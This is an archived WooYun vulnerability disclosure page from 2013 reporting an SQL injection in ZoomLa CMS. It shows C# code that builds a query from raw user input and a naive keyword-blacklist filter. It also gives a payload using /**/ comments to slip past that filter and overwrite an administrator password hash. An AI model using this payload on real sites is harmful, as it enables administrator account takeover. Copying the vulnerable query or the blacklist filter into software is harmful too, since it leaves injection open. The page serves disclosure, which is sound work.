@@ -1,0 +1,279 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		逐浪CMS通用型SQL注入3  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		逐浪CMS通用型SQL注入3  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2013-11-19 02:40</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-19：	细节已通知厂商并且等待厂商处理中<br/>
+									1970-01-01：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-11-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">绕过了那个很简单的防注入。直接可以update管理员密码。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">没什么太多可说的……就注入。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">注入点：<br />
+<br />
+http://demo.zoomla.cn/user/cashcoupon/arrivejihuo.aspx<br />
+<br />
+页面的按钮点击事件：<br />
+<br />
+</p><pre><code>protected void Btn_Click调用了b_Arrive.UpdateState(text);<br />
+public bool UpdateState(string ArriveNo)<br />
+{<br />
+	string sqlStr = &quot;Update ZL_Arrive SET State =1 WHERE ArriveNO=&#039;&quot; + ArriveNo + &quot;&#039;&quot;;  ///果断注入<br />
+	return SqlHelper.ExecuteSql(sqlStr);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+Page_Load方法里面有调用到了一个函数：<br />
+<br />
+DataSecurity.StartProcessRequest();<br />
+<br />
+<br />
+<br />
+上面这个函数具体是这样的：<br />
+<br />
+<br />
+<br />
+</p><pre><code>public static void StartProcessRequest()<br />
+{<br />
+	try<br />
+	{<br />
+		if (HttpContext.Current.Request.QueryString != null)<br />
+		{<br />
+			for (int i = 0; i &lt; HttpContext.Current.Request.QueryString.Count; i++)<br />
+			{<br />
+				string getkeys = HttpContext.Current.Request.QueryString.Keys[i];<br />
+				if (!DataSecurity.ProcessSqlStr(HttpContext.Current.Request.QueryString[getkeys]))<br />
+				{<br />
+					function.WriteErrMsg(&quot;数据不能包含SQL注入代码!&quot;);<br />
+					HttpContext.Current.Response.End();<br />
+				}<br />
+			}<br />
+		}<br />
+		if (HttpContext.Current.Request.Form != null)<br />
+		{<br />
+			for (int j = 0; j &lt; HttpContext.Current.Request.Form.Count; j++)<br />
+			{<br />
+				string getkeys = HttpContext.Current.Request.Form.Keys[j];<br />
+				if (!DataSecurity.ProcessSqlStr(HttpContext.Current.Request.Form[getkeys]))<br />
+				{<br />
+					function.WriteErrMsg(&quot;数据不能包含SQL注入代码!&quot;);<br />
+					HttpContext.Current.Response.End();<br />
+				}<br />
+			}<br />
+		}<br />
+	}<br />
+	……<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+里面还调用到一个DataSecurity.ProcessSqlStr<br />
+<br />
+<br />
+<br />
+</p><pre><code>public static bool ProcessSqlStr(string Str)<br />
+{<br />
+	bool ReturnValue = true;<br />
+	Str = Str.ToLower();<br />
+	try<br />
+	{<br />
+		if (Str != &quot;&quot;)<br />
+		{<br />
+			string SqlStr = &quot;and |exec |insert |select |delete |update |count |chr |mid |master |truncate |char |declare &quot;;<br />
+			string[] anySqlStr = SqlStr.Split(new char[]<br />
+			{<br />
+				&#039;|&#039;<br />
+			});<br />
+			string[] array = anySqlStr;<br />
+			for (int i = 0; i &lt; array.Length; i++)<br />
+			{<br />
+				string ss = array[i];<br />
+				if (Str.IndexOf(ss) &gt;= 0)<br />
+				{<br />
+					ReturnValue = false;<br />
+				}<br />
+			}<br />
+		}<br />
+	}<br />
+	catch<br />
+	{<br />
+		ReturnValue = false;<br />
+	}<br />
+	return ReturnValue;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+对于变量<br />
+<br />
+string SqlStr = &quot;and |exec |insert |select |delete |update |count |chr |mid |master |truncate |char |declare &quot;;<br />
+<br />
+里面的特征字符串，仅仅是做了一个很简单的匹配，很容易绕过，看例子：<br />
+<br />
+在页面正常输入东西：<br />
+<br />
+</p><p class="detail"><a href="../images/241728536287683c9a47887c854a9e53f81ae409.png" target="_blank"><img src="../images/241728536287683c9a47887c854a9e53f81ae409.png" alt="image019.png" width="600"/></a></p><p class="detail"><br />
+<br />
+提交的时候截断一下，改下优惠券编号的代码，如下：<br />
+<br />
+1&#039;;update/**/zl_manager set adminpassword=&#039;c4ca4238a0b923820dcc509a6f75849b&#039; where adminname=&#039;testuser&#039;--<br />
+<br />
+执行前管理密码是这样的：<br />
+<br />
+</p><p class="detail"><a href="../images/24173227674b6af055cb4d7c4af413690ce58ee4.png" target="_blank"><img src="../images/24173227674b6af055cb4d7c4af413690ce58ee4.png" alt="image023.png" width="600"/></a></p><p class="detail"><br />
+<br />
+执行后是这样的：<br />
+<br />
+</p><p class="detail"><a href="../images/2417324280f0b6a3dc479db3d543d71f79aec775.png" target="_blank"><img src="../images/2417324280f0b6a3dc479db3d543d71f79aec775.png" alt="image027.png" width="600"/></a></p><p class="detail"><br />
+<br />
+表明注入成功。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤，参数化查询。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040915" title="逐浪CMS通用型SQL注入3">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-19 02:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：10 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40915";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
